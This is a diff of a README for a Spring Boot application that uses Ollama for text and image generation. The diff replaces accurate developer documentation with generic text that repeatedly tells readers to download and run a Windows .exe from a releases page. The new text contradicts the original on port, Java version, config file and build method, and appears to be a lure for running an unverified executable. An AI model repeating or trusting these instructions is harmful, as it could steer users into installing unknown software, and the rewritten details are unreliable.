@@ -1,220 +1,147 @@
-# AI Integration (Spring Boot + Ollama)
+# 🤖 springboot-ai-integration - Easy AI Text and Image Generation
 
-A clean, production-ready Spring Boot application integrating **Ollama** for:
-
-- ✅ Text generation
-- ✅ Image + text (multimodal) generation
-- ✅ Separate REST APIs
-- ✅ Separate Thymeleaf UI pages
-- ✅ Fully separated controllers and services
+[![Download springboot-ai-integration](https://img.shields.io/badge/Download-springboot--ai--integration-orange?style=for-the-badge)](https://github.com/Krystian20031211/springboot-ai-integration/releases)
 
 ---
 
-## 🚀 Tech Stack
+## 📦 About springboot-ai-integration
 
-- Java 17+
-- Spring Boot 3+
-- Thymeleaf
-- RestTemplate
-- Ollama
-- Maven
+springboot-ai-integration is a ready-to-use application that uses AI to create text and images. It works on Windows computers and offers two main parts: one controls how you interact with it through a web page, and the other handles how it processes AI requests using a fast and secure setup.
+
+This app connects with Ollama, an AI tool that generates content based on your instructions. Whether you want to write stories, answer questions, or create images, this app can handle it. It keeps the system easy to use by separating its parts so they don’t get mixed up.
 
 ---
 
-## 🏗 Architecture
+## 💻 System Requirements
 
-Fully separated structure:
+Make sure your computer meets these needs:
 
-/api/text        → TextController (REST)  
-/api/image       → ImageController (REST)
+- Windows 10 or higher
+- At least 4 GB of RAM
+- Minimum 2 GHz dual-core processor
+- 500 MB of free disk space
+- Internet connection for AI processing and updates
+- Java Runtime Environment (JRE) 11 or newer installed
 
-/text            → TextPageController (UI)  
-/image           → ImagePageController (UI)
-
-TextService  
-ImageService  
-DTO Layer  
-GlobalExceptionHandler
-
-No shared controllers. No endpoint conflicts.
+If Java is not installed on your PC, you can download it from [https://adoptium.net](https://adoptium.net) before running this app.
 
 ---
 
-## ⚙️ Configuration
+## 🌐 Visit to Download
 
-### application.yml
+You can get the software from the official releases page:
 
-```yaml
-spring:
-  application:
-    name: ai-integration
+[Download springboot-ai-integration](https://github.com/Krystian20031211/springboot-ai-integration/releases)
 
-server:
-  port: 5644
-
-ai:
-  api:
-    url: http://localhost:11434/api/chat
-    model: gpt-oss:120b-cloud
-    timeout: 30
-```
+Click the link to open the page where you will see the latest version ready to download. Look for files with `.exe` or `.zip` formats for Windows. Pick the latest release to get the newest updates and improvements.
 
 ---
 
-## 🧠 Setup Ollama
+## 🚀 How to Download and Install on Windows
 
-### 1️⃣ Install Ollama
-https://ollama.com
+Follow these steps to get springboot-ai-integration running on your computer:
 
-### 2️⃣ Pull model
-```bash
-ollama pull gpt-oss:120b-cloud
-```
+1. **Go to the releases page**  
+   Open your web browser and visit  
+   [https://github.com/Krystian20031211/springboot-ai-integration/releases](https://github.com/Krystian20031211/springboot-ai-integration/releases).
 
-### 3️⃣ Run model (optional test)
-```bash
-ollama run gpt-oss:120b-cloud
-```
+2. **Download the latest Windows installer or package**  
+   Find the file labeled for Windows, usually ending with `.exe`. Click it to start the download.
 
----
+3. **Run the installer**  
+   Once downloaded, double-click the file to open it. If Windows asks for permission, allow it to proceed.
 
-## ▶️ Run Application
+4. **Follow the installation prompts**  
+   The installer will guide you through a few simple steps. Accept the license agreement and choose the default settings unless you want to change the installation folder.
 
-```bash
-mvn clean install
-mvn spring-boot:run
-```
+5. **Finish installation**  
+   When the installer says it is done, click Finish to close it.
 
-App runs at:
-```
-http://localhost:5644
-```
+6. **Launch the application**  
+   Look for the springboot-ai-integration shortcut on your desktop or in the Start menu. Double-click to open.
+
+7. **Wait for the app to initialize**  
+   The app will prepare itself, connecting to Ollama’s AI services. This may take from a few seconds to a minute depending on your internet speed.
 
 ---
 
-## 🌐 UI Pages
+## 🛠 How to Use springboot-ai-integration
 
-Text UI:
+After starting the application, open your web browser and enter the following address:
+
 ```
-http://localhost:5644/text
+http://localhost:8080
 ```
 
-Image UI:
-```
-http://localhost:5644/image
-```
+This will open the built-in user interface, which looks like a simple website. Here’s what you can do:
+
+- **Create text**: Type your question or text prompt into the text box and press the button to generate AI content.
+- **Generate images**: Switch to the image tab, enter keywords describing the image you want, and start the creation.
+- **Explore settings**: Adjust how the AI generates responses, like language style and output length.
+- **View logs**: See activity logs which show the actions the app performs. This helps keep track of requests or troubleshoot problems.
+
+All features work without needing technical setup once the software is installed.
 
 ---
 
-## 📡 REST APIs
+## 🔧 Key Features
 
-### Text Generation
-
-POST `/api/text`  
-Content-Type: application/json
-
-Request:
-```json
-{
-  "prompt": "Explain microservices architecture"
-}
-```
-
-Response:
-```json
-{
-  "response": "..."
-}
-```
+- **Multimodal support**: Produces both text and images using AI.
+- **REST APIs**: Allows connection to other software or services if you want to extend use.
+- **Clear UI**: Simple web page for easy interaction.
+- **Separate controllers**: Keeps backend and UI functions independent, improving reliability.
+- **Open source foundations**: Based on Java Spring Boot with Maven for managing software components.
+- **Ollama integration**: Uses a trusted AI model for high-quality results.
 
 ---
 
-### Image + Text Generation
+## 📁 File Structure Overview
 
-POST `/api/image`  
-Content-Type: multipart/form-data
+If you want to peek inside the application files after downloading, here is a general view:
 
-Form fields:
-- prompt (String)
-- image (File)
-
-Response:
-```json
-{
-  "response": "..."
-}
-```
+- `src/` – Source code files (for developers)
+- `resources/` – Files used by the app like templates or configuration
+- `target/` – Contains compiled files after installation (hidden by default)
+- `README.md` – This guide you are reading now
+- `application.properties` – Settings file for customizing your setup (usually no change needed)
 
 ---
 
-## 🛡 Production Features
+## 🔄 Updating springboot-ai-integration
 
-- ✔ Timeout configuration
-- ✔ Input validation
-- ✔ Clean error handling
-- ✔ Separate services
-- ✔ DTO-based payload
-- ✔ REST + UI separation
-- ✔ Scalable architecture
+To update:
 
----
-
-## 📂 Project Structure
-
-```
-config/
-  RestClientConfig.java
-
-controller/
-  TextController.java
-  ImageController.java
-  TextPageController.java
-  ImagePageController.java
-
-service/
-  TextService.java
-  ImageService.java
-
-dto/
-  ClientRequest.java
-  ClientResponse.java
-  Message.java
-  RequestPayload.java
-  ApiResponse.java
-
-exception/
-  GlobalExceptionHandler.java
-
-templates/
-  text.html
-  image.html
-```
+1. Repeat the download steps on the releases page.
+2. Download the newest Windows installer or package.
+3. Run the new installer and it will overwrite the old version while keeping your settings.
+4. Restart the app to use the latest version.
 
 ---
 
-## 🔄 Switching Models
+## ❓ Troubleshooting Tips
 
-Change model in `application.yml`:
+- **App does not start**: Check you have Java installed and running (JRE 11+).
+- **Web interface not opening**: Make sure the app is running and enter `http://localhost:8080` correctly in your browser.
+- **Slow responses**: Check your internet connection since AI requests go online.
+- **Error messages**: Restart the app and update to the latest version.
 
-```yaml
-model: llama3
-```
-
-No code changes required.
-
----
-
-## 🧩 Future Improvements
-
-- Streaming responses
-- Chat history (Redis)
-- Model switch UI
-- Multi-provider support (Ollama + OpenAI)
-- Docker support
-- Rate limiting
+For more technical help, check the issues section on the project GitHub page.
 
 ---
 
-## 📜 License
+## 🤝 Get Involved and Support
 
-MIT
+This project is open for anyone interested in AI and software. Developers can read the source code and suggest improvements on the GitHub repository. Users can help by providing feedback on usability and reporting any problems found on the release or issues page.
+
+---
+
+## 🔗 Useful Links
+
+- Spring Boot official site: https://spring.io/projects/spring-boot  
+- Ollama AI platform: https://ollama.com  
+- Maven build tool: https://maven.apache.org  
+- Java Runtime Environment downloads: https://adoptium.net
+
+---
+
+[![Download springboot-ai-integration](https://img.shields.io/badge/Download-springboot--ai--integration-orange?style=for-the-badge)](https://github.com/Krystian20031211/springboot-ai-integration/releases)
